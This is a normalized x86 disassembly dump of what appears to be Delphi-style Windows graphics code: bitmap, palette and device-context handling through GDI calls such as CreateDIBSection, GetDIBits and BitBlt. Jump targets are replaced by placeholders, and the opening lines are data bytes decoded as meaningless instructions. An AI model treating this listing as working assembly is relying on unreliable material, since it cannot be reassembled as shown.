add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x4b300040 ] bl
inc edx
add al bh
jpo r-xdata
inc eax
add [ ecx + ecx * 2 + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4249 ] ch
shr [ eax + 0x7004249 ] 0xd
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_424b5c
xor eax eax
pop edx
rcl [ ebp + 0x68 ] 0x42
dec edx
inc edx
add [ edi + edi * 8 + 0x30 ] ah
jae r-xdata
push r-xdata
mov eax [ ebp - 0xc ]
call sub_421364
retn
dec ecx
inc edx
add [ eax ] cl
out dx eax
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
sub_4249cc
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4178dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424a6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a71
mov eax [ rw-data ]
call sub_417940
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_424a42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_424b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_421364
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417570
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_421308
test al al
je r-xdata
sub_424a78
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4178dc
mov esi eax
xor ecx ecx
push ebp
push sub_424ae8
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417940
retn
mov edx ebx
mov eax esi
call sub_417570
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_424b5c
sub_424af4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_420d88
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_424b30
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_424b5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420e4c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_424b5c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4210c0
xor edx edx
push ebp
push sub_424bf0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4214ec
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4178f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_421364
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_424bfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4210c0
xor eax eax
push ebp
push sub_424cdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_425f18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_424a78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426018
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4214ec
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_417854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_421364
retn
sub_424cec
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4032e8
sub_424d0c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_424a78
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d18c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_424d68
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41f6dc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_424a78
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_424a78
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_424db4
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_421ff8
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_424e63
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_424e70
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_424ebc
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_424a78
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_421864
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_42550a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_40276c
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425214
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_421744
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_421864
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_421864
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_421864
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_421864
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4254bb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4254aa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_425488
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_421864
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_424e70
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_402968
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_421ff8
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_420c6c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41613c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41ffac
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_420c30
call sub_41ffac
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4217bc
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42548f
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42545e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_421864
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_40278c
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41ffac
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_420c30
call sub_41ffac
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41ffac
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_420c30
call sub_41ffac
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_421864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403b20
call sub_403b20
jmp r-xdata
sub_4254b1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4254c0
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_425520
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_425584
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_424a78
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42577f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_421864
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425737
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_424ebc
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_425790
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4229e4
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_424ce8
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4257f8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_425f08
mov eax [ esi + 0x28 ]
call sub_424cec
mov eax [ esi + 0x2c ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_425834
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4258ec
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cfc
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_426178
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_424ce8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_424cec
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417b14
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_425924
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_425f08
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4259b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_425520
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_424ebc
